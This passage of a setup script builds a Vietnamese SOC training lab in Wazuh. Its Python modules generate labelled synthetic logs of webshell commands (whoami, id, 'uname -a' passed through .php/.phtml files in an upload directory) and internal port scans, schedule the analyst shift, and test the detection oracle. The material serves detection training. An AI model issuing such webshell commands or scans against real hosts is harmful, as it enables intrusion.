    """netfilter qua syslog -> decoder kernel, luat nen 4100 (spike S-A)."""
    sport = sport or 40000 + (int(ts * 1000) % 20000)
    return ("%s %s kernel: [%d.%03d] ACCEPT IN=eth0 OUT= MAC= SRC=%s DST=%s LEN=60 TOS=0x00 PREC=0x00 "
            "TTL=64 ID=%d DF PROTO=%s SPT=%d DPT=%d WINDOW=64240 RES=0x00 SYN URGP=0") % (
        syslog_ts(ts), host, int(ts) % 100000, int(ts * 1000) % 1000, src, dst, int(ts) % 65000 + 1, proto,
        sport, dport)
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib/socq"
cat > "$LAB/siem/bai18/lib/socq/families.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# families.py - bo sinh kich ban (dinh dang replay.py) cho 2 viec ky nghe phat hien cua Bai 18:
#   R-A (100330-100339): moi lenh goi qua script trong thu muc upload, KHONG phu thuoc ten tham so
#   R-B (100340-100349): 1 may ket noi toi nhieu dich noi bo - giu recall, them ngoai le co can cu (CHG)
# Moi kich ban = 1 phien logtest. Tap dev (giao SV khi yeu cau xuat hien) va tap AN (chi tren siem)
# deu sinh tu CUNG the gioi cua SV -> IP may sao luu, cong agent, script da duyet khop voi ctx-*.
# Tap an BAT BUOC co cac kich ban danh vao loi dien hinh (kich ban 5.2 / P7: T5-T8, T10).
# ============================================================================
import random

from . import chain, docs

RANGES = "ra=100330-100339,rb=100340-100349"
UP_EXT = ["php", "phtml", "phar"]


def _web(ts, w, src, url, status=200):
    return docs.line_web(ts, "web-shop", src, "GET", url, status, 1200)


# ---------------------------------------------------------------- R-A
def ra_scenarios(w, rng, hidden):
    out = []
    t = 1795500000
    params = list(w.cmd_params) + (["zz", "q", "id2", "r"] if hidden else [])
    names = [w.webshell] + (["img_%d.php" % rng.randint(10, 99), "cache_%d.phar" % rng.randint(10, 99),
                             "2026/11/logo_%d.phtml" % rng.randint(10, 99)] if hidden else ["thumb_%d.php" % rng.randint(10, 99)])
    k = 0
    for name in names:                                 # DOC: lenh qua webshell, ten tham so doi
        for _ in range(2 if hidden else 1):
            k += 1
            lines = [_web(t + j, w, w.attacker_ip if not hidden else "%d.%d.%d.%d" % (rng.choice([45, 91, 185]), rng.randint(1, 254), rng.randint(1, 254), rng.randint(11, 249)),
                          "%s%s?%s=%s" % (w.upload_dir, name, rng.choice(params), rng.choice(["id", "ls+-la", "uname+-a", "whoami"])))
                     for j in range(rng.randint(1, 3))]
            out.append({"id": "ra-m-%02d" % k, "family": "ra", "label": "mal", "variant": name.rsplit(".", 1)[1], "lines": lines})
    ben = [
        ("anh", ["%savatar_%d.png" % (w.upload_dir, rng.randint(1000, 9999)) for _ in range(3)]),
        ("anh-cache-buster", ["%savatar_%d.jpg?v=%d" % (w.upload_dir, rng.randint(1000, 9999), rng.randint(1, 9)) for _ in range(2)]),
        ("script-da-duyet", ["%s%s?w=128&h=128&f=avatar_%d.png" % (w.upload_dir, w.approved_script, rng.randint(1000, 9999)) for _ in range(3)]),
        ("php-ngoai-upload", ["/product.php?id=%d" % rng.randint(1, 900), "/search.php?q=ao+khoac"]),
        ("script-khong-query", ["%s%s" % (w.upload_dir, w.webshell)]),
    ]
    if hidden:
        ben += [("script-da-duyet-2", ["%s%s?w=64&h=64&f=x_%d.webp&crop=1" % (w.upload_dir, w.approved_script, rng.randint(1, 999))]),
                ("anh-trong-thu-muc-con", ["%s2026/11/banner_%d.png?x=1" % (w.upload_dir, rng.randint(1, 99))]),
                ("trang-admin", ["/admin/index.php?tab=orders", "/profile/upload_avatar.php?step=2"])]
    for i, (v, urls) in enumerate(ben, 1):
        src = "%d.%d.%d.%d" % (rng.choice([14, 27, 113, 171]), rng.randint(1, 254), rng.randint(1, 254), rng.randint(1, 254))
        out.append({"id": "ra-b-%02d" % i, "family": "ra", "label": "benign", "variant": v,
                    "lines": [_web(t + j, w, src, u) for j, u in enumerate(urls)]})
    return out


# ---------------------------------------------------------------- R-B
def _conns(t, host, src, dsts, ports, rng):
    return [docs.line_conn(t + j * 0.5, host, src, d, rng.choice(ports)) for j, d in enumerate(dsts)]


def rb_scenarios(w, rng, hidden):
    t = 1795500000
    internal = [h["ip"] for n, h in w.hosts.items() if n not in ("siem",)]
    srv = [n for n in w.hosts if not n.startswith(("ws-", "bk-")) and n not in ("siem", "web-shop", "dns-01")]
    out = []

    def add(label, variant, lines):
        out.append({"id": "rb-%s-%02d" % ("m" if label == "mal" else "b", sum(1 for x in out if x["label"] == label) + 1),
                    "family": "rb", "label": label, "variant": variant, "lines": lines})

    n = lambda: rng.randint(10, 14)
    ws = w.ip("web-shop")
    # --- DOC
    add("mal", "quet-tu-web-shop", _conns(t, "web-shop", ws, rng.sample(internal, n()), chain.SCAN_PORTS, rng))
    h = rng.choice(srv)
    add("mal", "quet-ssh", _conns(t, h, w.ip(h), rng.sample(internal, n()), [22], rng))
    bk = rng.choice(w.backup_hosts)
    add("mal", "may-sao-luu-sai-cong", _conns(t, bk, w.ip(bk), rng.sample(internal, n()), [22, 445, 3389], rng))
    if hidden:
        h2 = rng.choice([x for x in srv if x != h])
        add("mal", "may-ngoai-CHG-dung-cong-agent", _conns(t, h2, w.ip(h2), rng.sample(internal, n()), [w.backup_port], rng))
        add("mal", "quet-ssh-tu-web-shop", _conns(t, "web-shop", ws, rng.sample(internal, n()), [22], rng))
        wsx = rng.choice([x for x in w.hosts if x.startswith("ws-")])
        add("mal", "quet-tu-may-tram", _conns(t, wsx, w.ip(wsx), rng.sample(internal, n()), [445, 139, 3389], rng))
    # --- LANH
    for bk in (w.backup_hosts if hidden else w.backup_hosts[:1]):
        add("benign", "sao-luu-CHG", _conns(t, bk, w.ip(bk), rng.sample(internal, rng.randint(12, 18)), [w.backup_port], rng))
    add("benign", "ung-dung-toi-db", _conns(t, "erp-01", w.ip("erp-01"), [w.ip("db-core")] * 15, [3306], rng))
    add("benign", "it-dich", _conns(t, "jump-01", w.ip("jump-01"), rng.sample(internal, 5), [22], rng))
    if hidden:
        wsx = rng.choice([x for x in w.hosts if x.startswith("ws-")])
        add("benign", "may-tram-toi-dns", _conns(t, wsx, w.ip(wsx), [w.ip("dns-01")] * 20, [53], rng))
        add("benign", "it-dich-2", _conns(t, "mail-01", w.ip("mail-01"), rng.sample(internal, 6), [25, 993], rng))
    return out


def build(w, seed, hidden):
    rng = random.Random("%s:fam:%s" % (seed, "an" if hidden else "dev"))
    return {"ra": ra_scenarios(w, rng, hidden), "rb": rb_scenarios(w, rng, hidden)}
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib/socq"
cat > "$LAB/siem/bai18/lib/socq/indexer.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# indexer.py - client toi gian cho wazuh-indexer (OpenSearch :9200) + saved-objects cua dashboard.
# CHI chay tren siem (indexer nghe 127.0.0.1 - spike S-C). Mat khau admin doc tu ANH NEN:
#   /root/wazuh-admin-credentials.txt  (indexer_password: '...')
# Bai hoc Lab 17: HTTP 200 khong co nghia la thanh cong -> luon kiem 'errors' / items[].error.
# ============================================================================
import base64
import json
import re
import ssl
import time
import urllib.error
import urllib.request

CRED = "/root/wazuh-admin-credentials.txt"
_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE


class IndexerError(Exception):
    pass


def admin_password(path=CRED):
    m = re.search(r"indexer_password:\s*'([^']+)'", open(path).read())
    if not m:
        raise IndexerError("khong doc duoc mat khau admin tu %s" % path)
    return m.group(1)


class Indexer:
    def __init__(self, base="https://127.0.0.1:9200", dash="https://127.0.0.1", user="admin", password=None, timeout=60):
        self.base, self.dash, self.user = base, dash, user
        self.password = password or admin_password()
        self.timeout = timeout

    def _req(self, method, url, body=None, nd=False, hdr=None, ok=(200, 201)):
        data = None
        if body is not None:
            data = (body if isinstance(body, str) else json.dumps(body)).encode()
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("Authorization", "Basic " + base64.b64encode(("%s:%s" % (self.user, self.password)).encode()).decode())
        req.add_header("Content-Type", "application/x-ndjson" if nd else "application/json")
        for k, v in (hdr or {}).items():
            req.add_header(k, v)
        for attempt in range(4):
            try:
                with urllib.request.urlopen(req, context=_CTX, timeout=self.timeout) as r:
                    txt = r.read().decode() or "{}"
                    return r.status, json.loads(txt)
            except urllib.error.HTTPError as e:
                txt = e.read().decode(errors="replace")
                if e.code in ok:
                    return e.code, json.loads(txt or "{}")
                if e.code in (429, 502, 503) and attempt < 3:      # indexer qua tai / dang khoi dong
                    time.sleep(5 * (attempt + 1))
                    continue
                return e.code, {"error": txt[:500]}
            except (urllib.error.URLError, OSError) as e:
                if attempt < 3:
                    time.sleep(5 * (attempt + 1))
                    continue
                raise IndexerError("%s %s: %s" % (method, url, e))
        raise IndexerError("%s %s: het so lan thu" % (method, url))

    # ------------------------------------------------------------ cum
    def wait_ready(self, wait=900):
        t0 = time.time()
        while time.time() - t0 < wait:
            try:
                c, h = self._req("GET", self.base + "/_cluster/health")
                if c == 200 and h.get("status") in ("green", "yellow"):
                    return True
            except IndexerError:
                pass
            time.sleep(10)
        return False

    def wait_dashboard(self, wait=900):
        t0 = time.time()
        while time.time() - t0 < wait:
            try:
                c, h = self._req("GET", self.dash + "/api/status")
                lvl = (((h.get("status") or {}).get("overall") or {}).get("state")
                       or ((h.get("status") or {}).get("overall") or {}).get("level"))
                if c == 200 and str(lvl).lower() in ("green", "available"):
                    return True
            except IndexerError:
                pass
            time.sleep(10)
        return False

    # ------------------------------------------------------------ du lieu
    def ensure_index(self, name, mappings=None):
        c, r = self._req("HEAD" if False else "GET", self.base + "/" + name)
        if c == 200:
            return False
        body = {"settings": {"number_of_replicas": 0}}
        if mappings:
            body["mappings"] = mappings
        c, r = self._req("PUT", self.base + "/" + name, body)
        if c not in (200, 201) and "resource_already_exists" not in json.dumps(r):
            raise IndexerError("tao index %s: %s %s" % (name, c, r))
        return True

    def bulk(self, docs_by_index, chunk=500, refresh=False):
        """docs_by_index: {index: [doc,...]} hoac list (index, doc). Tra so doc da ghi; loi -> IndexerError."""
        items = []
        if isinstance(docs_by_index, dict):
            for idx, ds in docs_by_index.items():
                items += [(idx, d) for d in ds]
        else:
            items = list(docs_by_index)
        n = 0
        for i in range(0, len(items), chunk):
            part = items[i:i + chunk]
            body = "".join(json.dumps({"index": {"_index": idx}}) + "\n" + json.dumps(d) + "\n" for idx, d in part)
            last = i + chunk >= len(items)
            c, r = self._req("POST", self.base + "/_bulk" + ("?refresh=true" if (refresh and last) else ""), body, nd=True)
            if c != 200 or r.get("errors"):
                bad = [it for it in r.get("items", []) if (it.get("index") or {}).get("error")]
                raise IndexerError("bulk loi (HTTP %s): %s" % (c, json.dumps(bad[:2] or r)[:600]))
            n += len(part)
        return n

    def count(self, index, query):
        c, r = self._req("POST", self.base + "/%s/_count" % index, {"query": query})
        return r.get("count", 0) if c == 200 else -1

    def delete_index(self, name):
        return self._req("DELETE", self.base + "/" + name, ok=(200, 404))[0]

    # ------------------------------------------------------------ dashboard
    def index_pattern(self, pid, title, time_field=None):
        attrs = {"title": title}
        if time_field:
            attrs["timeFieldName"] = time_field
        c, r = self._req("POST", self.dash + "/api/saved_objects/index-pattern/%s?overwrite=true" % pid,
                         {"attributes": attrs}, hdr={"osd-xsrf": "true"})
        if c not in (200, 201):
            raise IndexerError("tao index pattern %s: %s %s" % (title, c, r))
        return True


CTX_MAPPING = {"properties": {
    "id": {"type": "keyword"}, "type": {"type": "keyword"}, "kind": {"type": "keyword"},
    "host": {"type": "keyword"}, "ip": {"type": "keyword"}, "status": {"type": "keyword"},
    "criticality": {"type": "keyword"}, "user": {"type": "keyword"}, "actor": {"type": "keyword"},
    "name": {"type": "text", "fields": {"raw": {"type": "keyword"}}},
    "match": {"type": "keyword"}, "start": {"type": "date"}, "end": {"type": "date"},
    "description": {"type": "text"}, "@timestamp": {"type": "date"}}}
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib/socq"
cat > "$LAB/siem/bai18/lib/socq/shift.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# shift.py - lich ca truc 90' va trang thai ca (dung chung siem: lich-ca.py / grade18; defender doc shift.json).
#
# Moc tinh bang GIAY tu T0. Lech ngau nhien +-120 s theo SV, GIU thu tu nhan qua
# (C1 < C2 < C3 < R-A ; C3 < C4 < bao < C5 < C6). Va cham co chu dich KHONG duoc gian ra (kich ban 5.2).
# shift.json (doc boi defender qua shiftd) CHI co: t0, end, cac moc DA PHAT (id + gio). Khong co dap an.
# ============================================================================
import json
import os
import random
import time

SHIFT_LEN = 90 * 60

# moc goc (giay) - kich ban muc 5.1
BASE = {"C1": 8 * 60, "C2": 18 * 60, "C3": 30 * 60, "R-A": 32 * 60, "C4": 45 * 60,
        "R-B": 48 * 60, "C5": 50 * 60, "C5_END": 65 * 60, "C6": 72 * 60}
WAVES = [(0, 0), (25 * 60, 40 * 60), (55 * 60, 70 * 60)]      # dot 1 phat ngay tai T0
REMIND = [60 * 60, 80 * 60, 90 * 60]


def jitter(rng, s, j=120):
    return max(0, int(s + rng.randint(-j, j)))


def make(rng, queue, scale=1.0):
    """queue: list cac dot (list plan) tu cases.plan_queue. -> (events, inc_map)
       events: list {id, kind, at} da sap xep; inc_map: id ticket (Q<i>/C<k>) -> 'INC-2xx'."""
    at = {k: jitter(rng, v) for k, v in BASE.items()}
    # giu thu tu nhan qua sau khi lech
    order = ["C1", "C2", "C3", "R-A", "C4", "R-B", "C5", "C6"]
    for a, b in zip(order, order[1:]):
        if at[b] <= at[a] + 60:
            at[b] = at[a] + 60 + rng.randint(0, 60)
    at["C5_END"] = max(at["C5_END"], at["C5"] + 10 * 60)
    ev = []
    qi = 0
    for (lo, hi), grp in zip(WAVES, queue):
        for p in grp:
            t = 0 if hi == 0 else rng.randint(lo, hi)
            ev.append({"id": "Q%d" % qi, "kind": "ticket", "at": t, "pattern": p["pattern"]})
            qi += 1
    for k in ("C1", "C2", "C4", "C6"):
        ev.append({"id": k, "kind": "ticket", "at": at[k], "pattern": k})
    ev.append({"id": "C3", "kind": "c3_start", "at": at["C3"]})
    ev.append({"id": "R-A", "kind": "request", "at": at["R-A"]})
    ev.append({"id": "R-B", "kind": "storm_start", "at": at["R-B"]})
    ev.append({"id": "C5", "kind": "c5_start", "at": at["C5"]})
    ev.append({"id": "C5_END", "kind": "c5_end", "at": at["C5_END"]})
    for r in REMIND:
        ev.append({"id": "NHAC_%d" % (r // 60), "kind": "remind", "at": r})
    ev.append({"id": "END", "kind": "end", "at": SHIFT_LEN})
    for e in ev:
        e["at"] = int(e["at"] * scale)
    ev.sort(key=lambda e: (e["at"], e["id"]))
    # ticket: so INC tang theo thu tu xuat hien, khoang cach ngau nhien 1-6; 1 ticket ton ca chieu co so thap hon
    tickets = [e for e in ev if e["kind"] == "ticket"]
    n = rng.randint(201, 230)
    inc = {}
    backlog = rng.choice([e for e in tickets if e["at"] == 0 and e["id"].startswith("Q")])
    inc[backlog["id"]] = "INC-%d" % (n - rng.randint(8, 20))
    backlog["backlog"] = True
    for e in tickets:
        if e["id"] in inc:
            continue
        inc[e["id"]] = "INC-%d" % n
        n += rng.randint(1, 6)
    for e in tickets:
        e["inc"] = inc[e["id"]]
    return ev, inc


class State:
    """Trang thai ca tren siem: T0, nhat ky phat (bu khi khoi dong lai), shift.json cho shiftd."""

    def __init__(self, d, public_dir):
        self.d, self.pub = d, public_dir
        os.makedirs(d, exist_ok=True)
        os.makedirs(public_dir, exist_ok=True)
        self.log = os.path.join(d, "events.log")

    def t0(self):
        p = os.path.join(self.d, "T0")
        return int(open(p).read().split()[0]) if os.path.exists(p) else None

    def set_t0(self, t0):
        _atomic(os.path.join(self.d, "T0"), "%d\n" % t0)

    def done(self):
        if not os.path.exists(self.log):
            return {}
        out = {}
        for line in open(self.log):
            p = line.split()
            if len(p) >= 2:
                out[p[0]] = int(p[1])
        return out

    def mark(self, eid, when=None):
        with open(self.log, "a") as f:
            f.write("%s %d\n" % (eid, int(when or time.time())))
            f.flush()
            os.fsync(f.fileno())

    def publish(self, events, extra=None):
        """Ghi shift.json (KHONG dap an): t0, end, moc da phat, ticket da phat (INC + gio)."""
        t0 = self.t0()
        dn = self.done()
        pub = {"t0": t0, "end": (t0 + max(e["at"] for e in events if e["kind"] == "end")) if t0 else None,
               "now": int(time.time()), "released": {}, "tickets": {}}
        for e in events:
            if e["id"] in dn:
                if e["kind"] == "ticket":
                    pub["tickets"][e["inc"]] = dn[e["id"]]
                elif e["kind"] in ("request", "storm_start", "end", "remind"):
                    pub["released"][e["id"]] = dn[e["id"]]
        if extra:
            pub.update(extra)
        _atomic(os.path.join(self.pub, "shift.json"), json.dumps(pub, sort_keys=True))
        return pub


def _atomic(path, text):
    tmp = path + ".tmp"
    with open(tmp, "w") as f:
        f.write(text)
    os.replace(tmp, path)


def due(events, t0, done, now=None):
    """Su kien da toi gio nhung chua phat (bu sau khi lab khoi dong lai)."""
    now = now or time.time()
    return [e for e in events if e["id"] not in done and t0 + e["at"] <= now]
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib/socq"
cat > "$LAB/siem/bai18/lib/socq/test_socq.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# test_socq.py - kiem bat bien cua thu vien socq tren nhieu seed (chay truoc moi commit):
#   python3 -m socq.test_socq [so_seed]        (dung tu thu muc labs/_shared)
# Moi bat bien gan voi mot dong cua kich ban Bai 18 (muc 5.1, 9.2) hoac SOP Bai 14.
# ============================================================================
import datetime
import json
import re
import sys
import time

from . import ca, cases, chain, docs, families

RE_WEB = re.compile(r'^\w{3} [ \d]\d \d\d:\d\d:\d\d web-shop nginx: \S+ - - \[[^\]]+\] "(GET|POST) \S+ HTTP/1.1" \d{3} \d+ ')
RE_CONN = re.compile(r'^\w{3} [ \d]\d \d\d:\d\d:\d\d \S+ kernel: \[\d+\.\d+\] ACCEPT IN=eth0 .* SRC=\S+ DST=\S+ .*PROTO=TCP SPT=\d+ DPT=\d+ ')


def parse_iso(s):
    return datetime.datetime.fromisoformat(s).timestamp()


def ctx_match(c, plan, ts):
    """Ban ghi ngu canh KHOP DU theo SOP muc 4 cho ticket nay (-> danh sach so ID khop)."""
    w = c.w
    out = []
    pat = plan["pattern"]
    for r in c.records["ctx-changes"] + c.records["ctx-hr"] + c.records["ctx-assets"]:
        if r.get("type") == "asset":
            continue
        ok_status = r["status"] == "approved"
        if pat in ("T1", "X1B1", "B1") and r["id"].startswith("CHG") and r["kind"] == "vuln_scan":
            if plan["host"] in r["host"] and plan["src"] in r.get("ip", []) and ok_status and \
                    parse_iso(r["start"]) <= ts <= parse_iso(r["end"]):
                out.append(int(r["id"].split("-")[1]))
        if pat in ("T5", "B4") and r["id"].startswith("OC"):
            if plan["host"] in r["host"] and r["user"] == plan["user"]["user"] and ok_status and \
                    parse_iso(r["start"]) <= ts <= parse_iso(r["end"]):
                out.append(int(r["id"].split("-")[1]))
        if pat in ("F1", "F2", "M1") and r["id"].startswith("SVC") and ok_status and plan["host"] in r["host"]:
            m = r["match"]
            if (pat == "F1" and m == plan["domain"]) or (pat == "F2" and m == plan["path"]) or \
                    (pat == "M1" and plan["path"] in m and plan["dst"] in m):
                out.append(int(r["id"].split("-")[1]))
    return out


def check(seed):
    t_ref = 1795500000 + seed * 977
    s = ca.build(seed, t_ref)
    w, cx, ev, ans = s["world"], s["ctx"], s["events"], s["answers"]
    errs = []
    E = lambda m: errs.append("seed %d: %s" % (seed, m))
    q = [e for e in ev if e["kind"] == "ticket" and e["id"].startswith("Q")]
    # ---- hang doi
    if len(q) != 9:
        E("hang doi co %d ticket" % len(q))
    waves = [[e for e in q if lo <= e["at"] <= hi] for lo, hi in [(0, 0), (25 * 60, 40 * 60), (55 * 60, 70 * 60)]]
    if [len(x) for x in waves] != [4, 3, 2]:
        E("co cau dot %s" % [len(x) for x in waves])
    for i, wv in enumerate(waves):
        if all(ans[e["inc"]]["V"] == 1 for e in wv):
            E("dot %d toan TP" % (i + 1))
    for e in q:
        a = ans[e["inc"]]
        if a["V"] == 1 and a["P"] == 1:
            E("ticket thuong %s la TP P1" % e["inc"])
        if a["V"] in (2, 3) and a["P"] != 4:
            E("BTP/FP %s co P=%s" % (e["inc"], a["P"]))
    pats = [e["pattern"] for e in q]
    if "M1" not in pats:
        E("thieu M1 (moi gom su co)")
    if sum(1 for p in pats if cases.LABEL[p] == 2) < 2 or sum(1 for p in pats if cases.LABEL[p] == 3) < 2:
        E("it hon 2 BTP hoac 2 FP")
    # ---- chuoi
    for k in ("C1", "C2", "C4", "C6"):
        a = ans[s["inc"][k]]
        if (a["V"], a["P"]) != (1, 1):
            E("%s khong phai TP P1" % k)
    p1 = sorted(i for i, a in ans.items() if a["isp1"])
    if p1 != s["sc"]["TICKETS"]:
        E("tap P1 %s != SC1 %s" % (p1, s["sc"]["TICKETS"]))
    at = {e["id"]: e["at"] for e in ev}
    for a, b in [("C1", "C2"), ("C2", "C3"), ("C3", "R-A"), ("C3", "C4"), ("C4", "R-B"), ("R-B", "C5"), ("C5", "C6")]:
        if not at[a] < at[b]:
            E("thu tu %s < %s sai (%s, %s)" % (a, b, at[a], at[b]))
    if not (60 * 60 <= at["C6"] <= 85 * 60):
        E("C6 luc %d'" % (at["C6"] // 60))
    if max(at.values()) > 90 * 60:
        E("su kien sau het ca")
    incs = [e["inc"] for e in ev if e["kind"] == "ticket"]
    if len(set(incs)) != len(incs):
        E("INC trung")
    order = [e["inc"] for e in sorted([e for e in ev if e["kind"] == "ticket" and not e.get("backlog")], key=lambda e: (e["at"], e["id"]))]
    nums = [int(x[4:]) for x in order]
    if nums != sorted(nums):
        E("INC khong tang theo thoi gian")
    bl = [e for e in ev if e.get("backlog")]
    if len(bl) != 1 or int(bl[0]["inc"][4:]) >= min(nums):
        E("ticket ton ca chieu sai")
    # ---- render + ngu canh khop du (SOP muc 4)
    for e in ev:
        if e["kind"] != "ticket":
            continue
        p = s["plans"][e["id"]]
        ts = t_ref + 600 + e["at"]
        rng = ca.event_rng(seed, e["id"])
        tk, evd = (chain.render(e["id"], p, ts, w, rng) if e["id"].startswith("C") else cases.render(p, ts, w, rng))
        tk = docs.ticket(tk, e["inc"])
        json.dumps(tk), json.dumps(evd)
        if tk["predecoder"]["hostname"] != p["host"]:
            E("%s ticket tren may %s != %s" % (e["inc"], tk["predecoder"]["hostname"], p["host"]))
        if any(parse_iso(d["@timestamp"].replace("+0000", "+00:00")) > ts + 1 for d in evd):
            E("%s co bang chung SAU ticket" % e["inc"])
        if e["id"].startswith("Q"):
            m = ctx_match(cx, p, ts)
            a = ans[e["inc"]]
            if a["V"] == 1 and m:
                E("%s TP nhung co ngu canh khop du %s" % (e["inc"], m))
            if a["V"] in (2, 3) and m != [a["E"]]:
                E("%s %s: ngu canh khop %s != E %s" % (e["inc"], p["pattern"], m, a["E"]))
    # ---- dong log that
    rng = ca.event_rng(seed, "live")
    for l in chain.lines_webshell_cmd(t_ref, w, rng) + chain.lines_web_noise(t_ref, w, rng, 30):
        if not RE_WEB.match(l):
            E("dong web sai dinh dang: %s" % l[:90])
    for l in chain.lines_webshell_cmd(t_ref, w, rng):
        if "cmd=" in l or w.webshell not in l or "?" not in l:
            E("lenh webshell sai: %s" % l[:90])
    for l in chain.lines_storm(t_ref, w, rng, 30) + chain.lines_scan(t_ref, w, rng, 30):
        if not RE_CONN.match(l):
            E("dong ket noi sai dinh dang: %s" % l[:90])
    for l in chain.lines_storm(t_ref, w, rng, 50):
        src = re.search(r"SRC=(\S+)", l).group(1)
        if w.ip2host.get(src) not in w.backup_hosts or "DPT=%d " % w.backup_port not in l:
            E("bao khong tu may sao luu/cong CHG")
    bk = cx.records["ctx-changes"]
    chg = [r for r in bk if r["kind"] == "deploy" and r["status"] == "approved" and set(r["host"]) == set(w.backup_hosts)]
    if len(chg) != 1 or str(w.backup_port) not in chg[0]["description"]:
        E("CHG trien khai agent sao luu sai")
    # ---- tap R-A / R-B: nhan khop voi "giai mau" mo phong (oracle) - luat mau spike S-B
    ra_re = re.compile(r'"GET (%s[^?" ]*\.(?:php|phtml|phar)\?\S*) ' % re.escape(w.upload_dir))
    for hidden in (False, True):
        fam = families.build(w, seed, hidden)
        for sc in fam["ra"]:
            hit = any(m and not m.group(1).startswith(w.upload_dir + w.approved_script) for m in (ra_re.search(l) for l in sc["lines"]))
            if hit != (sc["label"] == "mal"):
                E("R-A %s (%s, an=%s): oracle=%s" % (sc["id"], sc["variant"], hidden, hit))
        for sc in fam["rb"]:
            dst = set()
            for l in sc["lines"]:
                src = re.search(r"SRC=(\S+)", l).group(1)
                port = int(re.search(r"DPT=(\d+)", l).group(1))
                if w.ip2host.get(src) in w.backup_hosts and port == w.backup_port:
                    continue                                  # ngoai le co can cu: may CHG + cong CHG
                dst.add(re.search(r"DST=(\S+)", l).group(1))
            hit = len(dst) >= 8
            if hit != (sc["label"] == "mal"):
                E("R-B %s (%s, an=%s): %d dich" % (sc["id"], sc["variant"], hidden, len(dst)))
        if hidden:
            vs = {x["variant"] for x in fam["rb"]}
            for need in ("quet-ssh", "quet-ssh-tu-web-shop", "may-sao-luu-sai-cong", "may-ngoai-CHG-dung-cong-agent", "quet-tu-web-shop"):
                if need not in vs:
                    E("tap an R-B thieu %s" % need)
    return errs


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 200
    t = time.time()
    errs = []
    for seed in range(1, n + 1):
        try:
            errs += check(seed)
        except Exception as ex:  # noqa: BLE001
            import traceback
            errs.append("seed %d: LOI %r\n%s" % (seed, ex, traceback.format_exc()[-600:]))
    for e in errs[:40]:
        print(e)
    print("%d seed, %d loi, %.1fs" % (n, len(errs), time.time() - t))
    sys.exit(1 if errs else 0)


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib/socq"
cat > "$LAB/siem/bai18/lib/socq/world.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# world.py - "the gioi" ca nhan hoa cua mot SV: may, IP, nhan su, ten file, cong...
# Moi gia tri ngau nhien deu lay tu rng (random.Random(seed)) -> tai lap duoc khi biet seed.
# Dung chung cho ctx.py, cases.py, chain.py va bo sinh tap kiem tra.
# ============================================================================
import random

HO = ["Nguyen", "Tran", "Le", "Pham", "Hoang", "Vu", "Vo", "Dang", "Bui", "Do", "Ngo", "Duong", "Ly"]
DEM = ["Van", "Thi", "Minh", "Duc", "Thanh", "Ngoc", "Quang", "Thu", "Hoai", "Gia", "Bao", "Anh"]
TEN = ["An", "Binh", "Chi", "Dung", "Giang", "Ha", "Hieu", "Hung", "Khanh", "Lam", "Linh", "Long",
       "Mai", "Nam", "Phong", "Phuc", "Quan", "Son", "Tam", "Thao", "Trang", "Tuan", "Viet", "Yen"]

# (ten, vai tro, muc quan trong) - web-shop co dinh la trung tam chuoi tan cong
HOSTS = [
    ("web-shop", "may chu web ban hang", "Cao"),
    ("db-core", "co so du lieu khach hang", "Cao"),
    ("ad-01", "may chu xac thuc", "Cao"),
    ("mail-01", "may chu thu", "TB"),
    ("file-01", "may chu file noi bo", "TB"),
    ("hr-app", "ung dung nhan su", "TB"),
    ("erp-01", "ung dung ke toan", "TB"),
    ("jump-01", "may trung gian quan tri", "TB"),
    ("web-staging", "moi truong thu nghiem web", "Thap"),
    ("ws-ketoan-03", "may tram ke toan", "Thap"),
    ("ws-kinhdoanh-07", "may tram kinh doanh", "Thap"),
    ("ws-nhansu-02", "may tram nhan su", "Thap"),
    ("ws-marketing-05", "may tram marketing", "Thap"),
    ("ws-kythuat-11", "may tram ky thuat", "Thap"),
    ("ws-cskh-04", "may tram cham soc khach hang", "Thap"),
    ("ws-kho-09", "may tram kho van", "Thap"),
    ("ws-phaply-06", "may tram phap ly", "Thap"),
    ("print-01", "may chu in", "Thap"),
]
INFRA = [("siem", "SIEM Wazuh", "Cao"), ("dns-01", "DNS noi bo", "Cao")]

WEBSHELL_NAMES = ["avatar_%d.phtml", "img_%d.phtml", "thumb_%d.phtml", "logo%d.phtml", "cache_%d.phtml"]
CMD_PARAMS = ["zq", "x", "p", "c0", "data", "q1", "_", "k", "act", "img"]   # KHONG dung 'cmd' (luat cu bat 'cmd=')
APPROVED_UPLOAD_SCRIPTS = ["resize.php", "thumb.php", "crop.php"]
BACKUP_PORTS = [9102, 9103, 8400, 10050]
EXFIL_SLD = ["cdn-sync", "img-cache", "telemetry-svc", "static-edge", "update-check"]
EXFIL_TLD = ["net", "info", "xyz", "top"]
AV_VENDORS = [("Bkav", "bkav-cloud.vn"), ("Kaspersky", "ksn-check.kaspersky.com"), ("ESET", "e5.sk.eset.com")]
MON_AGENTS = [("zabbix_agent2", "/opt/zabbix/bin/zabbix_agent2-sh-collector"),
              ("node_exporter", "/opt/prom/bin/node_exporter_shellcheck")]


class World:
    def __init__(self, rng):
        self.rng = rng
        self._used_last_octets = set()     # IOC so (E) phai DUY NHAT trong ca -> khong doan nham
        self._used_ips = set()
        self.subnet_srv = "10.%d.%d" % (rng.randint(10, 60), rng.randint(1, 50))
        self.subnet_ws = "10.%d.%d" % (rng.randint(61, 120), rng.randint(51, 99))
        self.hosts = {}
        for name, role, crit in HOSTS + INFRA:
            net = self.subnet_ws if name.startswith("ws-") or name == "print-01" else self.subnet_srv
